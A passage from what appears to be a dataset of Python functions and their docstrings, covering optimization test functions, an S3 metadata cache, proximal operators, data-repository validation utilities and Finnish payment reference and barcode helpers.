            "def rosenbrock(theta):\n    \"\"\"Objective and gradient for the rosenbrock function\"\"\"\n    x, y = theta\n    obj = (1 - x)**2 + 100 * (y - x**2)**2\n\n    grad = np.zeros(2)\n    grad[0] = 2 * x - 400 * (x * y - x**3) - 2\n    grad[1] = 200 * (y - x**2)\n    return obj, grad"
        ],
        [
            "def beale(theta):\n    \"\"\"Beale's function\"\"\"\n    x, y = theta\n    A = 1.5 - x + x * y\n    B = 2.25 - x + x * y**2\n    C = 2.625 - x + x * y**3\n    obj = A ** 2 + B ** 2 + C ** 2\n    grad = np.array([\n        2 * A * (y - 1) + 2 * B * (y ** 2 - 1) + 2 * C * (y ** 3 - 1),\n        2 * A * x + 4 * B * x * y + 6 * C * x * y ** 2\n    ])\n    return obj, grad"
        ],
        [
            "def booth(theta):\n    \"\"\"Booth's function\"\"\"\n    x, y = theta\n\n    A = x + 2 * y - 7\n    B = 2 * x + y - 5\n    obj = A**2 + B**2\n    grad = np.array([2 * A + 4 * B, 4 * A + 2 * B])\n    return obj, grad"
        ],
        [
            "def camel(theta):\n    \"\"\"Three-hump camel function\"\"\"\n    x, y = theta\n    obj = 2 * x ** 2 - 1.05 * x ** 4 + x ** 6 / 6 + x * y + y ** 2\n    grad = np.array([\n        4 * x - 4.2 * x ** 3 + x ** 5 + y,\n        x + 2 * y\n    ])\n    return obj, grad"
        ],
        [
            "def bohachevsky1(theta):\n    \"\"\"One of the Bohachevsky functions\"\"\"\n    x, y = theta\n    obj = x ** 2 + 2 * y ** 2 - 0.3 * np.cos(3 * np.pi * x) - 0.4 * np.cos(4 * np.pi * y) + 0.7\n    grad = np.array([\n        2 * x + 0.3 * np.sin(3 * np.pi * x) * 3 * np.pi,\n        4 * y + 0.4 * np.sin(4 * np.pi * y) * 4 * np.pi,\n    ])\n    return obj, grad"
        ],
        [
            "def dixon_price(theta):\n    \"\"\"Dixon-Price function\"\"\"\n    x, y = theta\n    obj = (x - 1) ** 2 + 2 * (2 * y ** 2 - x) ** 2\n    grad = np.array([\n        2 * x - 2 - 4 * (2 * y ** 2 - x),\n        16 * (2 * y ** 2 - x) * y,\n    ])\n    return obj, grad"
        ],
        [
            "def styblinski_tang(theta):\n    \"\"\"Styblinski-Tang function\"\"\"\n    x, y = theta\n    obj = 0.5 * (x ** 4 - 16 * x ** 2 + 5 * x + y ** 4 - 16 * y ** 2 + 5 * y)\n    grad = np.array([\n        2 * x ** 3 - 16 * x + 2.5,\n        2 * y ** 3 - 16 * y + 2.5,\n    ])\n    return obj, grad"
        ],
        [
            "def get_all_buckets(self, *args, **kwargs):\n        \"\"\"Return a list of buckets in MimicDB.\n\n        :param boolean force: If true, API call is forced to S3\n        \"\"\"\n        if kwargs.pop('force', None):\n            buckets = super(S3Connection, self).get_all_buckets(*args, **kwargs)\n\n            for bucket in buckets:\n                mimicdb.backend.sadd(tpl.connection, bucket.name)\n\n            return buckets\n\n        return [Bucket(self, bucket) for bucket in mimicdb.backend.smembers(tpl.connection)]"
        ],
        [
            "def get_bucket(self, bucket_name, validate=True, headers=None, force=None):\n        \"\"\"Return a bucket from MimicDB if it exists. Return a\n        S3ResponseError if the bucket does not exist and validate is passed.\n\n        :param boolean force: If true, API call is forced to S3\n        \"\"\"\n        if force:\n            bucket = super(S3Connection, self).get_bucket(bucket_name, validate, headers)\n            mimicdb.backend.sadd(tpl.connection, bucket.name)\n            return bucket\n\n        if mimicdb.backend.sismember(tpl.connection, bucket_name):\n            return Bucket(self, bucket_name)\n        else:\n            if validate:\n                raise S3ResponseError(404, 'NoSuchBucket')\n            else:\n                return Bucket(self, bucket_name)"
        ],
        [
            "def create_bucket(self, *args, **kwargs):\n        \"\"\"Add the bucket to MimicDB after successful creation.\n        \"\"\"\n        bucket = super(S3Connection, self).create_bucket(*args, **kwargs)\n\n        if bucket:\n            mimicdb.backend.sadd(tpl.connection, bucket.name)\n\n        return bucket"
        ],
        [
            "def sync(self, *buckets):\n        \"\"\"Sync either a list of buckets or the entire connection.\n\n        Force all API calls to S3 and populate the database with the current\n        state of S3.\n\n        :param \\*string \\*buckets: Buckets to sync\n        \"\"\"\n        if buckets:\n            for _bucket in buckets:\n                for key in mimicdb.backend.smembers(tpl.bucket % _bucket):\n                    mimicdb.backend.delete(tpl.key % (_bucket, key))\n\n                mimicdb.backend.delete(tpl.bucket % _bucket)\n\n                bucket = self.get_bucket(_bucket, force=True)\n\n                for key in bucket.list(force=True):\n                    mimicdb.backend.sadd(tpl.bucket % bucket.name, key.name)\n                    mimicdb.backend.hmset(tpl.key % (bucket.name, key.name), dict(size=key.size, md5=key.etag.strip('\"')))\n        else:\n            for bucket in mimicdb.backend.smembers(tpl.connection):\n                for key in mimicdb.backend.smembers(tpl.bucket % bucket):\n                    mimicdb.backend.delete(tpl.key % (bucket, key))\n\n                mimicdb.backend.delete(tpl.bucket % bucket)\n\n            for bucket in self.get_all_buckets(force=True):\n                for key in bucket.list(force=True):\n                    mimicdb.backend.sadd(tpl.bucket % bucket.name, key.name)\n                    mimicdb.backend.hmset(tpl.key % (bucket.name, key.name), dict(size=key.size, md5=key.etag.strip('\"')))"
        ],
        [
            "def get_key(self, *args, **kwargs):\n        \"\"\"Return the key from MimicDB.\n\n        :param boolean force: If true, API call is forced to S3\n        \"\"\"\n        if kwargs.pop('force', None):\n            headers = kwargs.get('headers', {})\n            headers['force'] = True\n            kwargs['headers'] = headers\n\n        return super(Bucket, self).get_key(*args, **kwargs)"
        ],
        [
            "def _get_key_internal(self, *args, **kwargs):\n        \"\"\"Return None if key is not in the bucket set.\n\n        Pass 'force' in the headers to check S3 for the key, and after fetching\n        the key from S3, save the metadata and key to the bucket set.\n        \"\"\"\n        if args[1] is not None and 'force' in args[1]:\n            key, res = super(Bucket, self)._get_key_internal(*args, **kwargs)\n\n            if key:\n                mimicdb.backend.sadd(tpl.bucket % self.name, key.name)\n                mimicdb.backend.hmset(tpl.key % (self.name, key.name),\n                                    dict(size=key.size,\n                                         md5=key.etag.strip('\"')))\n            return key, res\n\n        key = None\n\n        if mimicdb.backend.sismember(tpl.bucket % self.name, args[0]):\n            key = Key(self)\n            key.name = args[0]\n\n        return key, None"
        ],
        [
            "def get_all_keys(self, *args, **kwargs):\n        \"\"\"Return a list of keys from MimicDB.\n\n        :param boolean force: If true, API call is forced to S3\n        \"\"\"\n        if kwargs.pop('force', None):\n            headers = kwargs.get('headers', args[0] if len(args) else None) or dict()\n            headers['force'] = True\n            kwargs['headers'] = headers\n\n        return super(Bucket, self).get_all_keys(*args, **kwargs)"
        ],
        [
            "def delete_keys(self, *args, **kwargs):\n        \"\"\"Remove each key or key name in an iterable from the bucket set.\n        \"\"\"\n        ikeys = iter(kwargs.get('keys', args[0] if args else []))\n\n        while True:\n            try:\n                key = ikeys.next()\n            except StopIteration:\n                break\n\n            if isinstance(key, basestring):\n                mimicdb.backend.srem(tpl.bucket % self.name, key)\n                mimicdb.backend.delete(tpl.key % (self.name, key))\n            elif isinstance(key, BotoKey) or isinstance(key, Key):\n                mimicdb.backend.srem(tpl.bucket % self.name, key.name)\n                mimicdb.backend.delete(tpl.key % (self.name, key.name))\n\n        return super(Bucket, self).delete_keys(*args, **kwargs)"
        ],
        [
            "def _delete_key_internal(self, *args, **kwargs):\n        \"\"\"Remove key name from bucket set.\n        \"\"\"\n        mimicdb.backend.srem(tpl.bucket % self.name, args[0])\n        mimicdb.backend.delete(tpl.key % (self.name, args[0]))\n\n        return super(Bucket, self)._delete_key_internal(*args, **kwargs)"
        ],
        [
            "def list(self, *args, **kwargs):\n        \"\"\"Return an iterable of keys from MimicDB.\n\n        :param boolean force: If true, API call is forced to S3\n        \"\"\"\n        if kwargs.pop('force', None):\n            headers = kwargs.get('headers', args[4] if len(args) > 4 else None) or dict()\n            headers['force'] = True\n            kwargs['headers'] = headers\n\n            for key in super(Bucket, self).list(*args, **kwargs):\n                yield key\n\n        else:\n            prefix = kwargs.get('prefix', args[0] if args else '')\n\n            for key in mimicdb.backend.smembers(tpl.bucket % self.name):\n                if key.startswith(prefix):\n                    k = Key(self, key)\n\n                    meta = mimicdb.backend.hgetall(tpl.key % (self.name, key))\n\n                    if meta:\n                        k._load_meta(meta['size'], meta['md5'])\n\n                    yield k"
        ],
        [
            "def sync(self):\n        \"\"\"Sync a bucket.\n\n        Force all API calls to S3 and populate the database with the current state of S3.\n        \"\"\"\n        for key in mimicdb.backend.smembers(tpl.bucket % self.name):\n            mimicdb.backend.delete(tpl.key % (self.name, key))\n\n        mimicdb.backend.delete(tpl.bucket % self.name)\n        mimicdb.backend.sadd(tpl.connection, self.name)\n\n        for key in self.list(force=True):\n            mimicdb.backend.sadd(tpl.bucket % self.name, key.name)\n            mimicdb.backend.hmset(tpl.key % (self.name, key.name), dict(size=key.size, md5=key.etag.strip('\"')))"
        ],
        [
            "def lbfgs(x, rho, f_df, maxiter=20):\n    \"\"\"\n    Minimize the proximal operator of a given objective using L-BFGS\n\n    Parameters\n    ----------\n    f_df : function\n        Returns the objective and gradient of the function to minimize\n\n    maxiter : int\n        Maximum number of L-BFGS iterations\n    \"\"\"\n\n    def f_df_augmented(theta):\n        f, df = f_df(theta)\n        obj = f + (rho / 2.) * np.linalg.norm(theta - x) ** 2\n        grad = df + rho * (theta - x)\n        return obj, grad\n\n    res = scipy_minimize(f_df_augmented, x, jac=True, method='L-BFGS-B',\n                         options={'maxiter': maxiter, 'disp': False})\n\n    return res.x"
        ],
        [
            "def smooth(x, rho, penalty, axis=0, newshape=None):\n    \"\"\"\n    Applies a smoothing operator along one dimension\n\n    currently only accepts a matrix as input\n\n    Parameters\n    ----------\n    penalty : float\n\n    axis : int, optional\n        Axis along which to apply the smoothing (Default: 0)\n\n    newshape : tuple, optional\n        Desired shape of the parameters to apply the nuclear norm to. The given\n        parameters are reshaped to an array with this shape, or not reshaped if\n        the value of newshape is None. (Default: None)\n    \"\"\"\n\n    orig_shape = x.shape\n\n    if newshape is not None:\n        x = x.reshape(newshape)\n\n    # Apply Laplacian smoothing (l2 norm on the parameters multiplied by\n    # the laplacian)\n    n = x.shape[axis]\n    lap_op = spdiags([(2 + rho / penalty) * np.ones(n),\n                      -1 * np.ones(n), -1 * np.ones(n)],\n                     [0, -1, 1], n, n, format='csc')\n\n    A = penalty * lap_op\n    b = rho * np.rollaxis(x, axis, 0)\n    return np.rollaxis(spsolve(A, b), axis, 0).reshape(orig_shape)"
        ],
        [
            "def sdcone(x, rho):\n    \"\"\"Projection onto the semidefinite cone\"\"\"\n    U, V = np.linalg.eigh(x)\n    return V.dot(np.diag(np.maximum(U, 0)).dot(V.T))"
        ],
        [
            "def simplex(x, rho):\n    \"\"\"\n    Projection onto the probability simplex\n\n    http://arxiv.org/pdf/1309.1541v1.pdf\n    \"\"\"\n\n    # sort the elements in descending order\n    u = np.flipud(np.sort(x.ravel()))\n    lambdas = (1 - np.cumsum(u)) / (1. + np.arange(u.size))\n    ix = np.where(u + lambdas > 0)[0].max()\n    return np.maximum(x + lambdas[ix], 0)"
        ],
        [
            "def columns(x, rho, proxop):\n    \"\"\"Applies a proximal operator to the columns of a matrix\"\"\"\n\n    xnext = np.zeros_like(x)\n\n    for ix in range(x.shape[1]):\n        xnext[:, ix] = proxop(x[:, ix], rho)\n\n    return xnext"
        ],
        [
            "def gradient_optimizer(coro):\n    \"\"\"Turns a coroutine into a gradient based optimizer.\"\"\"\n\n    class GradientOptimizer(Optimizer):\n\n        @wraps(coro)\n        def __init__(self, *args, **kwargs):\n            self.algorithm = coro(*args, **kwargs)\n            self.algorithm.send(None)\n            self.operators = []\n\n        def set_transform(self, func):\n            self.transform = compose(destruct, func, self.restruct)\n\n        def minimize(self, f_df, x0, display=sys.stdout, maxiter=1e3):\n\n            self.display = display\n            self.theta = x0\n\n            # setup\n            xk = self.algorithm.send(destruct(x0).copy())\n            store = defaultdict(list)\n            runtimes = []\n            if len(self.operators) == 0:\n                self.operators = [proxops.identity()]\n\n            # setup\n            obj, grad = wrap(f_df, x0)\n            transform = compose(destruct, *reversed(self.operators), self.restruct)\n\n            self.optional_print(tp.header(['Iteration', 'Objective', '||Grad||', 'Runtime']))\n            try:\n                for k in count():\n\n                    # setup\n                    tstart = perf_counter()\n                    f = obj(xk)\n                    df = grad(xk)\n                    xk = transform(self.algorithm.send(df))\n                    runtimes.append(perf_counter() - tstart)\n                    store['f'].append(f)\n\n                    # Update display\n                    self.optional_print(tp.row([k,\n                                                f,\n                                                np.linalg.norm(destruct(df)),\n                                                tp.humantime(runtimes[-1])]))\n\n                    if k >= maxiter:\n                        break\n\n            except KeyboardInterrupt:\n                pass\n\n            self.optional_print(tp.bottom(4))\n\n            # cleanup\n            self.optional_print(u'\\u279b Final objective: {}'.format(store['f'][-1]))\n            self.optional_print(u'\\u279b Total runtime: {}'.format(tp.humantime(sum(runtimes))))\n            self.optional_print(u'\\u279b Per iteration runtime: {} +/- {}'.format(\n                tp.humantime(np.mean(runtimes)),\n                tp.humantime(np.std(runtimes)),\n            ))\n\n            # result\n            return OptimizeResult({\n                'x': self.restruct(xk),\n                'f': f,\n                'df': self.restruct(df),\n                'k': k,\n                'obj': np.array(store['f']),\n            })\n\n    return GradientOptimizer"
        ],
        [
            "def add(self, operator, *args):\n        \"\"\"Adds a proximal operator to the list of operators\"\"\"\n\n        if isinstance(operator, str):\n            op = getattr(proxops, operator)(*args)\n        elif isinstance(operator, proxops.ProximalOperatorBaseClass):\n            op = operator\n        else:\n            raise ValueError(\"operator must be a string or a subclass of ProximalOperator\")\n\n        self.operators.append(op)\n        return self"
        ],
        [
            "def _load_meta(self, size, md5):\n        \"\"\"Set key attributes to retrived metadata. Might be extended in the\n        future to support more attributes.\n        \"\"\"\n        if not hasattr(self, 'local_hashes'):\n            self.local_hashes = {}\n\n        self.size = int(size)\n\n        if (re.match('^[a-fA-F0-9]{32}$', md5)):\n            self.md5 = md5"
        ],
        [
            "def _send_file_internal(self, *args, **kwargs):\n        \"\"\"Called internally for any type of upload. After upload finishes,\n        make sure the key is in the bucket set and save the metadata.\n        \"\"\"\n        super(Key, self)._send_file_internal(*args, **kwargs)\n\n        mimicdb.backend.sadd(tpl.bucket % self.bucket.name, self.name)\n        mimicdb.backend.hmset(tpl.key % (self.bucket.name, self.name),\n                            dict(size=self.size, md5=self.md5))"
        ],
        [
            "def wrap(f_df, xref, size=1):\n    \"\"\"\n    Memoizes an objective + gradient function, and splits it into\n    two functions that return just the objective and gradient, respectively.\n\n    Parameters\n    ----------\n    f_df : function\n        Must be unary (takes a single argument)\n\n    xref : list, dict, or array_like\n        The form of the parameters\n\n    size : int, optional\n        Size of the cache (Default=1)\n    \"\"\"\n    memoized_f_df = lrucache(lambda x: f_df(restruct(x, xref)), size)\n    objective = compose(first, memoized_f_df)\n    gradient = compose(destruct, second, memoized_f_df)\n    return objective, gradient"
        ],
        [
            "def docstring(docstr):\n    \"\"\"\n    Decorates a function with the given docstring\n\n    Parameters\n    ----------\n    docstr : string\n    \"\"\"\n    def decorator(func):\n        @wraps(func)\n        def wrapper(*args, **kwargs):\n            return func(*args, **kwargs)\n        wrapper.__doc__ = docstr\n        return wrapper\n    return decorator"
        ],
        [
            "def check_grad(f_df, xref, stepsize=1e-6, tol=1e-6, width=15, style='round', out=sys.stdout):\n    \"\"\"\n    Compares the numerical gradient to the analytic gradient\n\n    Parameters\n    ----------\n    f_df : function\n        The analytic objective and gradient function to check\n\n    x0 : array_like\n        Parameter values to check the gradient at\n\n    stepsize : float, optional\n        Stepsize for the numerical gradient. Too big and this will poorly estimate the gradient.\n        Too small and you will run into precision issues (default: 1e-6)\n\n    tol : float, optional\n        Tolerance to use when coloring correct/incorrect gradients (default: 1e-5)\n\n    width : int, optional\n        Width of the table columns (default: 15)\n\n    style : string, optional\n        Style of the printed table, see tableprint for a list of styles (default: 'round')\n    \"\"\"\n    CORRECT = u'\\x1b[32m\\N{CHECK MARK}\\x1b[0m'\n    INCORRECT = u'\\x1b[31m\\N{BALLOT X}\\x1b[0m'\n\n    obj, grad = wrap(f_df, xref, size=0)\n    x0 = destruct(xref)\n    df = grad(x0)\n\n    # header\n    out.write(tp.header([\"Numerical\", \"Analytic\", \"Error\"], width=width, style=style) + \"\\n\")\n    out.flush()\n\n    # helper function to parse a number\n    def parse_error(number):\n\n        # colors\n        failure = \"\\033[91m\"\n        passing = \"\\033[92m\"\n        warning = \"\\033[93m\"\n        end = \"\\033[0m\"\n        base = \"{}{:0.3e}{}\"\n\n        # correct\n        if error < 0.1 * tol:\n            return base.format(passing, error, end)\n\n        # warning\n        elif error < tol:\n            return base.format(warning, error, end)\n\n        # failure\n        else:\n            return base.format(failure, error, end)\n\n    # check each dimension\n    num_errors = 0\n    for j in range(x0.size):\n\n        # take a small step in one dimension\n        dx = np.zeros(x0.size)\n        dx[j] = stepsize\n\n        # compute the centered difference formula\n        df_approx = (obj(x0 + dx) - obj(x0 - dx)) / (2 * stepsize)\n        df_analytic = df[j]\n\n        # absolute error\n        abs_error = np.linalg.norm(df_approx - df_analytic)\n\n        # relative error\n        error = abs_error if np.allclose(abs_error, 0) else abs_error / \\\n            (np.linalg.norm(df_analytic) + np.linalg.norm(df_approx))\n\n        num_errors += error >= tol\n        errstr = CORRECT if error < tol else INCORRECT\n        out.write(tp.row([df_approx, df_analytic, parse_error(error) + ' ' + errstr],\n                         width=width, style=style) + \"\\n\")\n        out.flush()\n\n    out.write(tp.bottom(3, width=width, style=style) + \"\\n\")\n    return num_errors"
        ],
        [
            "def evaluate(self, repo, spec, args):\n        \"\"\"\n        Evaluate the files identified for checksum.\n        \"\"\"\n\n        status = []\n\n        # Do we have to any thing at all? \n        if len(spec['files']) == 0: \n            return status \n\n        with cd(repo.rootdir):\n            \n            rules = None \n            if 'rules-files' in spec and len(spec['rules-files']) > 0: \n                rulesfiles = spec['rules-files']\n                rules = {} \n                for f in rulesfiles: \n                    d = json.loads(open(f).read())\n                    rules.update(d)\n            elif 'rules' in spec: \n                rules = {\n                    'inline': spec['rules'] \n                }\n                \n            if rules is None or len(rules) == 0:\n                print(\"Regression quality validation has been enabled but no rules file has been specified\")\n                print(\"Example: { 'min-r2': 0.25 }. Put this either in file or in dgit.json\")\n                raise InvalidParameters(\"Regression quality checking rules missing\")\n\n            files = dict([(f, open(f).read()) for f in spec['files']])\n\n            for r in rules:\n                if 'min-r2' not in rules[r]:\n                    continue\n                minr2 = float(rules[r]['min-r2'])\n                for f in files:\n                    match = re.search(r\"R-squared:\\s+(\\d.\\d+)\", files[f])\n                    if match is None:\n                        status.append({\n                            'target': f,\n                            'validator': self.name,\n                            'description': self.description,\n                            'rules': r,\n                            'status': \"ERROR\",\n                            'message': \"Invalid model output\"\n                            })\n                    else:\n                        r2 = match.group(1)\n                        r2 = float(r2)\n                        if r2 > minr2:\n                            status.append({\n                                'target': f,\n                                'validator': self.name,\n                                'description': self.description,\n                                'rules': r,\n                                'status': \"OK\",\n                                'message': \"Acceptable R2\"\n                            })\n                        else:\n                            status.append({\n                                'target': f,\n                                'validator': self.name,\n                                'description': self.description,\n                                'rules': r,\n                                'status': \"ERROR\",\n                                'message': \"R2 is too low\"\n                            })\n\n        return status"
        ],
        [
            "def evaluate(self, repo, spec, args):\n        \"\"\"\n        Check the integrity of the datapackage.json\n        \"\"\"\n\n        status = []\n        with cd(repo.rootdir):\n            files = spec.get('files', ['*'])\n            resource_files = repo.find_matching_files(files)\n            files = glob2.glob(\"**/*\")\n            disk_files = [f for f in files if os.path.isfile(f) and f != \"datapackage.json\"]\n\n            allfiles = list(set(resource_files + disk_files))\n            allfiles.sort()\n\n            for f in allfiles:\n                if f in resource_files and f in disk_files:\n                    r = repo.get_resource(f)\n                    coded_sha256 = r['sha256']\n                    computed_sha256 = compute_sha256(f)\n                    if computed_sha256 != coded_sha256:\n                        status.append({\n                            'target': f,\n                            'rules': \"\",\n                            'validator': self.name,\n                            'description': self.description,\n                            'status': 'ERROR',\n                            'message': \"Mismatch in checksum on disk and in datapackage.json\"\n                        })\n                    else:\n                        status.append({\n                            'target': f,\n                            'rules': \"\",\n                            'validator': self.name,\n                            'description': self.description,\n                            'status': 'OK',\n                            'message': \"\"\n                        })\n                elif f in resource_files:\n                    status.append({\n                        'target': f,\n                        'rules': \"\",\n                        'validator': self.name,\n                        'description': self.description,\n                        'status': 'ERROR',\n                        'message': \"In datapackage.json but not in repo\"\n                    })\n                else:\n                    status.append({\n                        'target': f,\n                        'rules': \"\",\n                        'validator': self.name,\n                        'description': self.description,\n                        'status': 'ERROR',\n                        'message': \"In repo but not in datapackage.json\"\n                        })\n\n\n        return status"
        ],
        [
            "def read_file(self, filename): \n        \"\"\"\n        Guess the filetype and read the file into row sets\n        \"\"\"\n        #print(\"Reading file\", filename)\n\n        try:\n            fh = open(filename, 'rb')\n            table_set = any_tableset(fh) # guess the type...\n        except:\n            #traceback.print_exc()\n            # Cannot find the schema.\n            table_set = None\n            \n        return table_set"
        ],
        [
            "def get_schema(self, filename):\n        \"\"\"\n        Guess schema using messytables\n        \"\"\"\n        table_set = self.read_file(filename)\n            \n        # Have I been able to read the filename\n        if table_set is None: \n            return [] \n\n        # Get the first table as rowset\n        row_set = table_set.tables[0]\n\n        offset, headers = headers_guess(row_set.sample)\n        row_set.register_processor(headers_processor(headers))\n        row_set.register_processor(offset_processor(offset + 1))\n        types = type_guess(row_set.sample, strict=True)\n\n        # Get a sample as well..\n        sample = next(row_set.sample)\n\n        clean = lambda v: str(v) if not isinstance(v, str) else v \n        schema = []\n        for i, h in enumerate(headers):\n            schema.append([h,\n                           str(types[i]),\n                           clean(sample[i].value)])\n\n        return schema"
        ],
        [
            "def int2fin_reference(n):\n    \"\"\"Calculates a checksum for a Finnish national reference number\"\"\"\n    checksum = 10 - (sum([int(c) * i for c, i in zip(str(n)[::-1], it.cycle((7, 3, 1)))]) % 10)\n    if checksum == 10:\n        checksum = 0\n    return \"%s%s\" % (n, checksum)"
        ],
        [
            "def iso_reference_valid_char(c, raise_error=True):\n    \"\"\"Helper to make sure the given character is valid for a reference number\"\"\"\n    if c in ISO_REFERENCE_VALID:\n        return True\n    if raise_error:\n        raise ValueError(\"'%s' is not in '%s'\" % (c, ISO_REFERENCE_VALID))\n    return False"
        ],
        [
            "def iso_reference_str2int(n):\n    \"\"\"Creates the huge number from ISO alphanumeric ISO reference\"\"\"\n    n = n.upper()\n    numbers = []\n    for c in n:\n        iso_reference_valid_char(c)\n        if c in ISO_REFERENCE_VALID_NUMERIC:\n            numbers.append(c)\n        else:\n            numbers.append(str(iso_reference_char2int(c)))\n    return int(''.join(numbers))"
        ],
        [
            "def iso_reference_isvalid(ref):\n    \"\"\"Validates ISO reference number\"\"\"\n    ref = str(ref)\n    cs_source = ref[4:] + ref[:4]\n    return (iso_reference_str2int(cs_source) % 97) == 1"
        ],
        [
            "def barcode(iban, reference, amount, due=None):\n    \"\"\"Calculates virtual barcode for IBAN account number and ISO reference\n\n    Arguments:\n        iban {string} -- IBAN formed account number\n        reference {string} -- ISO 11649 creditor reference\n        amount {decimal.Decimal} -- Amount in euros, 0.01 - 999999.99\n        due {datetime.date} -- due date\n    \"\"\"\n\n    iban = iban.replace(' ', '')\n    reference = reference.replace(' ', '')\n\n    if reference.startswith('RF'):\n        version = 5\n    else:\n        version = 4\n\n    if version == 5:\n        reference = reference[2:]  # test RF and add 00 where needed\n        if len(reference) < 23:\n            reference = reference[:2] + (\"0\" * (23 - len(reference))) + reference[2:]\n    elif version == 4:\n        reference = reference.zfill(20)\n\n    if not iban.startswith('FI'):\n        raise BarcodeException('Barcodes can be printed only for IBANs starting with FI')\n\n    iban = iban[2:]\n    amount = \"%08d\" % (amount.quantize(Decimal('.01')).shift(2).to_integral_value())\n    if len(amount) != 8:\n        raise BarcodeException(\"Barcode payment amount must be less than 1000000.00\")\n\n    if due:\n        due = due.strftime(\"%y%m%d\")\n    else:\n        due = \"000000\"\n\n    if version == 4:\n        barcode = \"%s%s%s000%s%s\" % (version, iban, amount, reference, due)\n    elif version == 5:\n        barcode = \"%s%s%s%s%s\" % (version, iban, amount, reference, due)\n\n    return barcode"
        ],
        [
            "def add_file_normal(f, targetdir, generator,script, source):\n    \"\"\"\n    Add a normal file including its source\n    \"\"\"\n\n    basename = os.path.basename(f)\n    if targetdir != \".\":\n        relativepath = os.path.join(targetdir, basename)\n    else:\n        relativepath = basename\n\n    relpath = os.path.relpath(f, os.getcwd())\n    filetype = 'data'\n    if script:\n        filetype = 'script'\n        if generator:\n            filetype = 'generator'\n\n    update = OrderedDict([\n        ('type', filetype),\n        ('generator', generator),\n        ('relativepath', relativepath),\n        ('content', \"\"),\n        ('source', source),\n        ('localfullpath', f),\n        ('localrelativepath', relpath)\n    ])\n\n    update = annotate_record(update)\n\n    return (basename, update)"
        ],
        [
            "def run_executable(repo, args, includes):\n    \"\"\"\n    Run the executable and capture the input and output...\n    \"\"\"\n\n    # Get platform information\n    mgr = plugins_get_mgr()\n    repomgr = mgr.get(what='instrumentation', name='platform')\n    platform_metadata = repomgr.get_metadata()\n\n    print(\"Obtaining Commit Information\")\n    (executable, commiturl) = \\\n            find_executable_commitpath(repo, args)\n\n    # Create a local directory\n    tmpdir = tempfile.mkdtemp()\n\n    # Construct the strace command\n    print(\"Running the command\")\n    strace_filename = os.path.join(tmpdir,'strace.out.txt')\n    cmd = [\"strace.py\", \"-f\", \"-o\", strace_filename,\n           \"-s\", \"1024\", \"-q\", \"--\"] + args\n\n    # Run the command\n    p = subprocess.Popen(cmd,\n                         stdout=subprocess.PIPE,\n                         stderr=subprocess.PIPE)\n    out, err = p.communicate()\n\n    # Capture the stdout/stderr\n    stdout = os.path.join(tmpdir, 'stdout.log.txt')\n    with open(stdout, 'w') as fd:\n        fd.write(out.decode('utf-8'))\n\n    stderr = os.path.join(tmpdir, 'stderr.log.txt')\n    with open(stderr, 'w') as fd:\n        fd.write(err.decode('utf-8'))\n\n\n    # Check the strace output\n    files = extract_files(strace_filename, includes)\n\n\n    # Now insert the execution metadata\n    execution_metadata = {\n        'likelyexecutable': executable,\n        'commitpath': commiturl,\n        'args': args,\n    }\n    execution_metadata.update(platform_metadata)\n\n    for i in range(len(files)):\n        files[i]['execution_metadata'] = execution_metadata\n\n    return files"
        ],
        [
            "def add(repo, args, targetdir,\n        execute=False, generator=False,\n        includes=[], script=False,\n        source=None):\n    \"\"\"\n    Add files to the repository by explicitly specifying them or by\n    specifying a pattern over files accessed during execution of an\n    executable.\n\n    Parameters\n    ----------\n\n    repo: Repository\n\n    args: files or command line\n         (a) If simply adding files, then the list of files that must\n         be added (including any additional arguments to be passed to\n         git\n         (b) If files to be added are an output of a command line, then\n         args is the command lined\n    targetdir: Target directory to store the files\n    execute: Args are not files to be added but scripts that must be run.\n    includes: patterns used to select files to\n    script: Is this a script?\n    generator: Is this a generator\n    source: Link to the original source of the data\n\n    \"\"\"\n\n    # Gather the files...\n    if not execute:\n        files = add_files(args=args,\n                          targetdir=targetdir,\n                          source=source,\n                          script=script,\n                          generator=generator)\n    else:\n        files = run_executable(repo, args, includes)\n\n    if files is None or len(files) == 0:\n        return repo\n\n\n    # Update the repo package but with only those that have changed.\n\n    filtered_files = []\n    package = repo.package\n    for h in files:\n        found = False\n        for i, r in  enumerate(package['resources']):\n            if h['relativepath'] == r['relativepath']:\n                found = True\n                if h['sha256'] == r['sha256']:\n                    change = False\n                    for attr in ['source']:\n                        if h[attr] != r[attr]:\n                            r[attr] = h[attr]\n                            change = True\n                    if change:\n                        filtered_files.append(h)\n                    continue\n                else:\n                    filtered_files.append(h)\n                    package['resources'][i] = h\n                break\n        if not found:\n            filtered_files.append(h)\n            package['resources'].append(h)\n\n    if len(filtered_files) == 0:\n        return 0\n\n    # Copy the files\n    repo.manager.add_files(repo, filtered_files)\n\n    # Write to disk...\n    rootdir = repo.rootdir\n    with cd(rootdir):\n        datapath = \"datapackage.json\"\n        with open(datapath, 'w') as fd:\n            fd.write(json.dumps(package, indent=4))\n\n    return len(filtered_files)"
        ],
        [
            "def find_matching_files(self, includes):\n        \"\"\"\n        For various actions we need files that match patterns\n        \"\"\"\n\n        if len(includes) == 0: \n            return [] \n\n        files = [f['relativepath'] for f in self.package['resources']]\n        includes = r'|'.join([fnmatch.translate(x) for x in includes])\n\n        # Match both the file name as well the path..\n        files = [f for f in files if re.match(includes, os.path.basename(f))] + \\\n                [f for f in files if re.match(includes, f)]\n        files = list(set(files))\n\n        return files"
        ],
        [
            "def run(self, cmd, *args):\n        \"\"\"\n        Run a specific command using the manager\n        \"\"\"\n        if self.manager is None:\n            raise Exception(\"Fatal internal error: Missing repository manager\")\n        if cmd not in dir(self.manager):\n            raise Exception(\"Fatal internal error: Invalid command {} being run\".format(cmd))\n        func = getattr(self.manager, cmd)\n        repo = self\n        return func(repo, *args)"
        ],
        [
            "def get_resource(self, p):\n        \"\"\"\n        Get metadata for a given file\n        \"\"\"\n        for r in self.package['resources']:\n            if r['relativepath'] == p:\n                r['localfullpath'] = os.path.join(self.rootdir, p)\n                return r\n\n        raise Exception(\"Invalid path\")"
        ],
        [
            "def lookup(self, username=None, reponame=None, key=None):\n        \"\"\"\n        Lookup all available repos\n        \"\"\"\n        if key is None:\n            key = self.key(username, reponame)\n        if key not in self.repos:\n            raise UnknownRepository()\n\n        return self.repos[key]"
        ],
        [
            "def rootdir(self,  username, reponame, create=True):\n        \"\"\"\n        Working directory for the repo\n        \"\"\"\n        path = os.path.join(self.workspace,\n                            'datasets',\n                            username,\n                            reponame)\n        if create:\n            try:\n                os.makedirs(path)\n            except:\n                pass\n\n        return path"
        ],
        [
